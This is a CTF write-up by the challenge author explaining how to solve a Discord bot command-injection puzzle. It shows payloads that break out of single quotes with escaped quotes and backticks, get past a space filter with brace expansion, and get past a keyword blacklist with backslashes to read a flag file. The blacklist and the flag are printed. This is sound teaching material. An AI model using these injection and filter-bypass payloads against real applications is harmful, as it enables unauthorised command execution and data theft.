# Painting Text

![](./img/category-misc.svg) ![](./img/difficulty-medium.svg)

![](/home/feelzor/.config/marktext/images/2022-11-20-10-49-56-image.png)

This is a challenge that I created. Therefore, I only present to you the expected way to solve it. It should contain just enough steps to understand what is going on, but may lack other tests and techniques that you would use during the CTF to solve such a challenge.

## The solution (without using the hints)

The entry point is to contact `Rot` with `!help`.

```bash
!help : print the help list
!beautify : make your text beautiful
 exemple: !beautify me
```

With `!beautify a` you can get this output.

```
  __ _ 
 / _` |
| (_| |
 \__,_|
```

With some digging, you can find that this may be any beautifier library or a command such as `figlet` executed in bash. The goal is to achieve a command injection, but there is a difficulty: the command is not executed as is.

### The blacklist

First, you can quickly determine that there is a blacklist, with a payload such as `&&ls`, the output is something like

```
The holy passion of Friendship is of so sweet and steady and loyal and
enduring a nature that it will last through a whole lifetime, if not asked to
lend money.
        -- Mark Twain, "Pudd'nhead Wilson's Calendar"
```

This is the output of the `fortune` command, without any argument so there shouldn't be any way to exploit it. At least not to my knowledge.

With that in mind, you can determine what the blacklist is made of. This is a bit long but you shouldn't bother determining the whole blacklist, you just need to find something that will let you execute a command.

```python
blacklist = ['less', 'more', 'nl', 'tail', 'head', 'strings', 'flag', ';', '&', '|', '<', '>', '$', '(', ')']
```

You may notice that the backtick character is missing from the blacklist, and it allows you to execute commands. `{}` and `cat` are also available, but we'll come to that later.

### Executing a command

The main difficulty of the challenge is to achieve command execution. If you send ``!beautify `ls```, the result is not what you expect.

```
 _ _     _ 
( ) |   ( )
 \| |___ \|
  | / __|  
  | \__ \  
  |_|___/  
```

The command is not executed. What may be happening here? Let's open our own terminal to try and understand.

```bash
echo "`ls`"
```

This command properly outputs the list of files in my current directory. Maybe there is something else?

```bash
echo '`ls`'
```

The output here is `` `ls` ``. That is when you realize that your command is wrapped inside single quotes `'`.

```bash
!beautify '`ls`'
```

```
 _ _ _     _ _ 
( | ) |   ( | )
|/ \| |___ \|/ 
    | / __|    
    | \__ \    
    |_|___/  
```

The quotes are appearing (it may be a little bit hard to read with figlet, but the program is showing ``'`ls`'`` as is). How is that possible? Once again, you can use your favorite terminal and try to achieve it, but this time it is easier to search for that on internet.

[Baeldung](https://www.baeldung.com/linux/single-quote-within-single-quoted-string) explains properly different ways to print a `'` character in a single quoted string. And the first way is to use `$` bash strings. You can look up the other methods which are interesting too, but wouldn't give much insight for this challenge.

So if you were trying to develop a way to properly show your single quotes inside the program, what would you do? My take was to replace all `'` by `\'` characters. So what is the figlet command for the last command? We can guess it is something such as

```bash
figlet $'\'`ls`\''
```

So the developer found a way to preserve their single quotes while having a "secure" command execution. How could we exploit that? This takes a bit of "I am the developer" to properly see the issue here. A naïve implementation would be to only use something like `string.replace("'", "\\'")` to fix the problem.

What happens if we escape our single quotes ourselves? Let's find out.

```bash
!beautify \'`ls`\'
```

```
__     _____             _              __ _ _      
\ \   |  __ \           | |            / _(_) |     
 \ \  | |  | | ___   ___| | _____ _ __| |_ _| | ___ 
  \ \ | |  | |/ _ \ / __| |/ / _ \ '__|  _| | |/ _ \
   \ \| |__| | (_) | (__|   <  __/ |  | | | | |  __/
    \_\_____/ \___/ \___|_|\_\___|_|  |_| |_|_|\___|


      _           _ _               
     | |         | | |              
  ___| |__   __ _| | |  _ __  _   _ 
 / __| '_ \ / _` | | | | '_ \| | | |
| (__| | | | (_| | | |_| |_) | |_| |
 \___|_| |_|\__,_|_|_(_) .__/ \__, |
                       | |     __/ |
                       |_|    |___/ 
                      _                               _        _        _   
                     (_)                             | |      | |      | |  
 _ __ ___  __ _ _   _ _ _ __ ___ _ __ ___   ___ _ __ | |_ ___ | |___  _| |_ 
| '__/ _ \/ _` | | | | | '__/ _ \ '_ ` _ \ / _ \ '_ \| __/ __|| __\ \/ / __|
| | |  __/ (_| | |_| | | | |  __/ | | | | |  __/ | | | |_\__ \| |_ >  <| |_ 
|_|  \___|\__, |\__,_|_|_|  \___|_| |_| |_|\___|_| |_|\__|___(_)__/_/\_\\__|
             | |                                                            
             |_|                                                            
__     
\ \    
 \ \   
  \ \  
   \ \ 
    \_\
```

Let's try to understand what happens here.

Our command was properly executed, but I probably won't teach you that the output of `ls` is not wrapped in `\`.

If we naïvely uses our replace on our command, we come up with

```bash
figlet $'\\'`ls`\\''
```

You can try it with `echo` instead of figlet in your terminal, and see that:

- `$'\\'` is the first string, it writes the character `\`.

- `` `ls` `` output will be concatenated with the previous character.

- `\\` will also output the character `\`

- `''` is an empty string, it simply outputs nothing.

That explains the presence of `\\` in the output, and will be very helpful to debug further attempts.

### Finding the flag

From there you have two paths that you may take. The first is to find a way to send spaces in your command (it does not work by default), and the other is to find a way to send a payload without spaces. The first approach necessarily ends up using the second one, so let's take the longest road to explain what happens.

To send spaces, on many discord bots, you can wrap your argument in double quoted `"`. Some of the participants found themselves stuck because of that, since using double quoted arguments without ending them causes the bot to just ignore you without sending anything back.

So let's send `ls -a` with ``!beautify "\'`ls -a`\'"``

```
____     
\ \ \    
 \ \ \   
  \ \ \  
   \ \ \ 
    \_\_\
```

What can possibly happen?

The first thing that you can guess is that discord messages are limited to `2048` characters and that there are too many hidden files that cause the message to be too long. This is not possible since we have a response, it just is empty.

We have the exact output of our bash command. So there is only one thing that may happen: the `ls` command fails. You can understand that because backticks only gives you the `stdout` output, not `stderr`. And most likely the bot ignores `stderr` completely, so we cannot see it.

But what is the cause of the command failure? `ls` did work so we do have access to the current folder with at least `r-x` permissions, and `-a` is a proper argument to `ls`. This takes a bit of guessing, but the problematic character is the space.

Another way to discover that without guessing is to send both `!beautify "a b"` and `!beautify "a   b"`. Since they give the exact same output with 1 space only, something is happening here.

Knowing what exactly is the problem is completely guessing and is not intended, but the thing is to understand that something is going on with spaces and that you may not use them.

Let's validate our theory. ``!beautify "\'`echo a`\'"`` outputs the same thing as the previous `ls`.

```bash
!beautify "\'`{echo,a}`\'"
```

```
__       __     
\ \      \ \    
 \ \   __ \ \   
  \ \ / _` \ \  
   \ \ (_| |\ \ 
    \_\__,_| \_\
```

The space **is** the problem. The reason that you cannot guess is that spaces are replaced by no-break spaces.

You can easily find this payload on the [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space) Github.

### Final difficulty

```bash
!beautify "\'`{ls,-a}`\'"
```

```
__                  __ _              _        _   
\ \                / _| |            | |      | |  
 \ \              | |_| | __ _  __ _ | |___  _| |_ 
  \ \             |  _| |/ _` |/ _` || __\ \/ / __|
   \ \ _   _ _   _| | | | (_| | (_| || |_ >  <| |_ 
    \_(_) (_|_) (_)_| |_|\__,_|\__, (_)__/_/\_\\__|
                                __/ |              
                               |___/               
 _____             _              __ _ _      
|  __ \           | |            / _(_) |     
| |  | | ___   ___| | _____ _ __| |_ _| | ___ 
| |  | |/ _ \ / __| |/ / _ \ '__|  _| | |/ _ \
| |__| | (_) | (__|   <  __/ |  | | | | |  __/
|_____/ \___/ \___|_|\_\___|_|  |_| |_|_|\___|


      _           _ _               
     | |         | | |              
  ___| |__   __ _| | |  _ __  _   _ 
 / __| '_ \ / _` | | | | '_ \| | | |
| (__| | | | (_| | | |_| |_) | |_| |
 \___|_| |_|\__,_|_|_(_) .__/ \__, |
                       | |     __/ |
                       |_|    |___/ 
                      _                               _        _        _   
                     (_)                             | |      | |      | |  
 _ __ ___  __ _ _   _ _ _ __ ___ _ __ ___   ___ _ __ | |_ ___ | |___  _| |_ 
| '__/ _ \/ _` | | | | | '__/ _ \ '_ ` _ \ / _ \ '_ \| __/ __|| __\ \/ / __|
| | |  __/ (_| | |_| | | | |  __/ | | | | |  __/ | | | |_\__ \| |_ >  <| |_ 
|_|  \___|\__, |\__,_|_|_|  \___|_| |_| |_|\___|_| |_|\__|___(_)__/_/\_\\__|
             | |                                                            
             |_|                                                            
__     
\ \    
 \ \   
  \ \  
   \ \ 
    \_\
```

Yay, finally!

```bash
!beautify "\'`{cat,.flag.txt}`\'"
```

```
Your lucky number has been disconnected.
```

Once again, we've hit the blacklist. Indeed, `flag` is in it. PayloadAllTheThings once again, let's try another payload:

```bash
!beautify "\'`{cat,.fl\ag.txt}`\'"
```

Once again, the output is solely `\\`. So there was an error, or the file is empty.

Maybe `.flag.txt` is not readable?

```bash
!beautify "\'`{ls,-l,.fl\ag.txt}`\'"
```

```
__                                                                         __ 
\ \                                                                       /_ |
 \ \ ______ _ ____      ________ _ ____      ________ _ __ ______ ______   | |
  \ \______| '__\ \ /\ / /______| '__\ \ /\ / /______| '__|______|______|  | |
   \ \     | |   \ V  V /       | |   \ V  V /       | |                   | |
    \_\    |_|    \_/\_/        |_|    \_/\_/        |_|                   |_|


                 _                     _     _  _  __   _   _              __ 
                | |                   | |   | || |/_ | | \ | |            /_ |
 _ __ ___   ___ | |_   _ __ ___   ___ | |_  | || |_| | |  \| | _____   __  | |
| '__/ _ \ / _ \| __| | '__/ _ \ / _ \| __| |__   _| | | . ` |/ _ \ \ / /  | |
| | | (_) | (_) | |_  | | | (_) | (_) | |_     | | | | | |\  | (_) \ V /   | |
|_|  \___/ \___/ \__| |_|  \___/ \___/ \__|    |_| |_| |_| \_|\___/ \_/    |_|


 __   __   ____  _____      __ _              _        ___     
/_ | / / _|___ \| ____|    / _| |            | |      | \ \    
 | |/ /_(_) __) | |__     | |_| | __ _  __ _ | |___  _| |\ \   
 | | '_ \  |__ <|___ \    |  _| |/ _` |/ _` || __\ \/ / __\ \  
 | | (_) | ___) |___) |  _| | | | (_| | (_| || |_ >  <| |_ \ \ 
 |_|\___(_)____/|____/  (_)_| |_|\__,_|\__, (_)__/_/\_\\__| \_\
                                        __/ |                  
                                       |___/                   
```

A little bit hard to read, but what we can understand is:

- File owned by `root:root`, with `664` permissions. At the very least, we can read the file.

- File size is `41`, so the file is **not** empty.

The problem does not come from the file, but from `cat`. In fact, it is not executable, but you can only guess it, you just know for sure that it does not work. Fortunately, there are many other executables available for you to read this file. Let's try with `nl`.

```bash
!beautify "\'`{nl,.fl\ag.txt}`\'"
```

```
You will be run over by a bus.
```

Welp thank you Rot, I really like knowing how I will die. But what matters to me is the contents of the `.flag.txt` file, would you please be gentle?

```bash
!beautify "\'`{n\l,.fl\ag.txt}`\'"
```

```
__       __ 
\ \     /_ |
 \ \     | |
  \ \    | |
   \ \   | |
    \_\  |_|


  _____ _    _ ___  ___   _______  __           ___          _                 
 / ____| |  | |__ \|__ \ / /  __ \/_ |         / _ \        | |                
| |  __| |__| |  ) |  ) | || |  | || |___  ___| | | |_ __ __| |  ___ _ __ ___  
| | |_ |  __  | / /  / / / | |  | || / __|/ __| | | | '__/ _` | / __| '_ ` _ \ 
| |__| | |  | |/ /_ / /\ \ | |__| || \__ \ (__| |_| | | | (_| || (__| | | | | |
 \_____|_|  |_|____|____| ||_____/ |_|___/\___|\___/|_|  \__,_| \___|_| |_| |_|
                         \_\                                ______             
                                                           |______|            
     _   _       _ ____       _  __                     __ _   _        __ _ _ 
    | | (_)     (_)___ \     | |/_ |                   /_ | | | |      / _(_) |
  __| |  _ _ __  _  __) | ___| |_| | ___  _ __ __      _| | |_| |__   | |_ _| |
 / _` | | | '_ \| ||__ < / __| __| |/ _ \| '_ \\ \ /\ / / | __| '_ \  |  _| | |
| (_| | | | | | | |___) | (__| |_| | (_) | | | |\ V  V /| | |_| | | | | | | | |
 \__,_| |_|_| |_| |____/ \___|\__|_|\___/|_| |_| \_/\_/ |_|\__|_| |_| |_| |_|_|
    ______     _/ |                          ______               ______       
   |______|   |__/                          |______|             |______|      
 _   ____         ____     
| | |___ \        \ \ \    
| |_  __) |_ __ ___| \ \   
| __||__ <| '__/ __|\ \ \  
| |_ ___) | |  \__ \/ /\ \ 
 \__|____/|_|  |___/ |  \_\
                  /_/      
```

**Flag:** `GH22{D1sc0rd_cmd_inj3ct1on_w1th_filt3rs}` (a bit hard to read)

## Hints

This challenge has been harder than I expected and went from 200 to 300 points during the CTF, since it was not as hard as other challenges but still harder than the majority of them.

One hour before the end of the CTF came the first hint to help execute a first command and understand how to bypass the single quotes, and 30 minutes before the end the second for those who were close but were stuck with the spaces.

I tried to make the challenge not a total "guessing" challenge with means to understand what was going on, but I think that the spaces being replaced was a bit too shady. Understanding where to begin and what to exploit may also feel like a guessing game, and I had no clue how to make it more obvious than a `figlet` command.
